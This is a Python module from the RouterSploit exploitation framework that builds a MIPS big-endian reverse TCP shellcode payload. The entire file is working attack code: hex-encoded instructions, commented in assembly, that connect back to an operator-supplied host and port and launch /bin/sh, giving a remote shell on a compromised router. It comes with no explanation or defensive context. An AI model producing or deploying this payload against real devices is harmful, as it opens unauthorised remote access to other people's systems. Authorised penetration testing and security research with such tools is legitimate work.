from routersploit import validators
from routersploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Exploit(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        'name': 'MIPSBE Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = Architectures.MIPSBE

    def generate(self):
        reverse_ip = validators.convert_ip(self.lhost)
        reverse_port = validators.convert_port(self.lport)
        return (
            "\x28\x04\xff\xff" +            # slti     a0,zero,-1
            "\x24\x02\x0f\xa6" +            # li       v0,4006
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x28\x04\x11\x11" +            # slti     a0,zero,4369
            "\x24\x02\x0f\xa6" +            # li       v0,4006
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x24\x0c\xff\xfd" +            # li       t4,-3
            "\x01\x80\x20\x27" +            # nor      a0,t4,zero
            "\x24\x02\x0f\xa6" +            # li       v0,4006
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x24\x0c\xff\xfd" +            # li       t4,-3
            "\x01\x80\x20\x27" +            # nor      a0,t4,zero
            "\x01\x80\x28\x27" +            # nor      a1,t4,zero
            "\x28\x06\xff\xff" +            # slti     a2,zero,-1
            "\x24\x02\x10\x57" +            # li       v0,4183
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x30\x44\xff\xff" +            # andi     a0,v0,0xffff
            "\x24\x02\x0f\xc9" +            # li       v0,4041
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x24\x02\x0f\xc9" +            # li       v0,4041
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x3c\x05\x00\x02" +            # lui      a1,0x2
            "\x34\xa5" + reverse_port +     # "\x7a\x69"  # ori   a1,a1,0x7a69
            "\xaf\xa5\xff\xf8" +            # sw       a1,-8(sp)
            "\x3c\x05" + reverse_ip[:2] +   # "\xc0\xa8"  # lui   a1,0xc0a8
            "\x34\xa5" + reverse_ip[2:] +   # "\x01\x37"  # ori   a1,a1,0x137
            "\xaf\xa5\xff\xfc" +            # sw       a1,-4(sp)
            "\x23\xa5\xff\xf8" +            # addi     a1,sp,-8
            "\x24\x0c\xff\xef" +            # li       t4,-17
            "\x01\x80\x30\x27" +            # nor      a2,t4,zero
            "\x24\x02\x10\x4a" +            # li       v0,4170
            "\x01\x09\x09\x0c" +            # syscall  0x42424
            "\x3c\x08\x2f\x2f" +            # lui      t0,0x2f2f
            "\x35\x08\x62\x69" +            # ori      t0,t0,0x6269
            "\xaf\xa8\xff\xec" +            # sw       t0,-20(sp)
            "\x3c\x08\x6e\x2f" +            # lui      t0,0x6e2f
            "\x35\x08\x73\x68" +            # ori      t0,t0,0x7368
            "\xaf\xa8\xff\xf0" +            # sw       t0,-16(sp)
            "\x28\x07\xff\xff" +            # slti     a3,zero,-1
            "\xaf\xa7\xff\xf4" +            # sw       a3,-12(sp)
            "\xaf\xa7\xff\xfc" +            # sw       a3,-4(sp)
            "\x23\xa4\xff\xec" +            # addi     a0,sp,-20
            "\x23\xa8\xff\xec" +            # addi     t0,sp,-20
            "\xaf\xa8\xff\xf8" +            # sw       t0,-8(sp)
            "\x23\xa5\xff\xf8" +            # addi     a1,sp,-8
            "\x27\xbd\xff\xec" +            # addiu    sp,sp,-20
            "\x28\x06\xff\xff" +            # slti     a2,zero,-1
            "\x24\x02\x0f\xab" +            # li       v0,4011
            "\x00\x90\x93\x4c"              # syscall  0x2424d
        )
